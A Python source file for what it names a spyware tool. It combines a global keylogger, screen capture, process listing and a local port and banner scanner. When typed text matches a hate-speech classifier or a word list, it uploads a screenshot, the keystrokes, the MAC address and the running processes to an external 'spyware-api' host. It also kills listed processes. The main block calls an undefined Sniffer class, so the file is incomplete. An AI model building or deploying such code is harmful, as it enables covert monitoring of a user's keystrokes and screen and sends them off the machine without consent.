import keyboard  # For Keylogger
from threading import Timer  # For Keylogger
from getmac import get_mac_address as gma  # For Mac Address
from PIL import ImageGrab  # For ScreenLogger
import base64  # For ScreenLogger
import requests  # For API
import json  # For API
import io  # For ScreenLogger
import psutil as ps  # For process
import time  # For API

from scapy.layers.dns import DNSQR, DNS
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6

import credenciais as cr  # For API
import threading
import socket
from IPy import IP  # For Scanner
from scapy.all import *

SEND_REPORT_EVERY = 30
PATH = "C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt"

def logging(text):
    arquivo = open(PATH, 'a')
    arquivo.writelines(str(time.ctime()) + "    " + text + "\n")
    arquivo.close()

def isHateSpeech(self):
    dataLogs = json.dumps({"valor": 0, "frase": self.log})
    header = {'Content-type': 'application/json'}
    hateSpeech = requests.post("https://hate-speech-portuguese.herokuapp.com/predict", data=dataLogs, headers=header)

    hateSpeechJson = json.loads(hateSpeech.content)
    print(hateSpeechJson)
    if hateSpeechJson[0]['valor'] == 1:
        return True

    return False


def isBadLanguage(self):
    log_tokenized = self.log.split()
    with open(r'C:\keyLogger\badLanguage.txt', encoding="utf8") as file:
        contents = file.read().split(';')
        for word in log_tokenized:
            if word.lower() in contents:
                logging("Palavra que gerou o alerta:" + word.lower() + "\n")
                return True


def areMaliciousProcess(self):
    with open('C:\keyLogger\maliciousProcess.txt', encoding="utf8") as file:
        contents = file.read().split(';')
        for proc in ps.process_iter():
            if proc.name().lower() in contents:
                if proc.name().lower() in proc.name().lower():
                    try:
                        proc.kill()
                    except Exception:
                        logging("Error to Kill the process\n" + str(Exception))
                        print("Error to Kill the process")
                        return False

                logging("Alerta gerado por causa do processo:" + proc.name() + "\n")
                self.log = "Alerta gerado por causa do processo: " + proc.name()
                return True


def getProcess():
    infoSet = set()
    for proc in ps.process_iter():
        info = proc.as_dict(attrs=['pid', 'name'])
        infoSet.add(info['name'])
    process = ''
    for t in infoSet:
        process = process + t + ','

    return process


def getImage():
    buffer = io.BytesIO()
    image = ImageGrab.grab()
    image.save(buffer, format='png')
    image.close()
    b64_str = base64.b64encode(buffer.getvalue())

    return str(b64_str)


def doLogin():
    dataUser = json.dumps({"login": cr.login, "password": cr.password})
    token = requests.post("https://spyware-api.herokuapp.com/login", dataUser).text
    logging("Login realizado, token:" + token + "\n")
    return {
        'Authorization': 'Bearer ' + token,
        'Content-type': 'application/json'
    }


def sendAlert(log):
    headers = doLogin()

    try:
        dataImage = json.dumps({"id": 0, "productImg": log, "base64Img": getImage()}, sort_keys=True, indent=4)
        image = requests.post("https://spyware-api.herokuapp.com/imagem/save", dataImage,
                              headers=headers)
        imageJson = json.loads(image.content)

        dataAlert = json.dumps({"pcId": str(gma()), "imagem": {"id": imageJson['id']}, "processos": getProcess()},
                               sort_keys=True, indent=4)
        alert = requests.post("https://spyware-api.herokuapp.com/alerta/save", dataAlert, headers=headers)

        print(alert)
        logging("Alert Saved!\n" + str(alert) + "\n")
        print("Alert Saved")
        time.sleep(10)
    except Exception:
        logging("Error to send Alert\n" + str(Exception))
        print("Error to send Alert")
        pass


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = ""
                self.log = self.log[:-1]
            elif name == "ctrl":
                name = ""
            elif name == "shift" or name == "caps lock":
                name = ""
            # else:
            #     name = name.replace(" ", "_")
            #     name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log and (isHateSpeech(self) or isBadLanguage(self) or areMaliciousProcess(self)):
            logging("Foi enviado o report!")
            sendAlert(self.log)

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


class Scanner(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.ports = []
        self.banners = []
        self.log = ''

    def banner(s):
        return s.recv(1024)

    def port_scanner(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            try:
                target_ip = IP(target)
            except:
                target_ip = socket.gethostbyname(target)

            s.connect((target_ip, port))
            try:
                banner_name = self.banner(s).decode()
                self.ports.append(port)

                self.banners.append(banner_name.strip())
            except:
                pass
        except:
            pass

    def run(self):
        for port in range(1, 5051):
            while threading.active_count() > 150:
                time.sleep(0.01)
            thread = threading.Thread(target=self.port_scanner, args=["localhost", port])
            thread.start()
        with open(r"C:\keyLogger\vulnarable_banners.txt", "r") as file:
            data = file.read()
            for i in range(len(self.banners)):
                if self.banners[i] in data:
                    self.log = f"[!]Vulneribility found: {self.banners[i]} at port {self.ports[i]}"
                    logging(self.log)
                    sendAlert(self.log)


if __name__ == "__main__":
    logging("Iniciou do programa!")
    logging("Iniciou o Scanner!")
    Scanner().start()
    logging("Iniciou do sniffer!")
    Sniffer().start()
    logging("Termino do Scanner do programa!")
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()

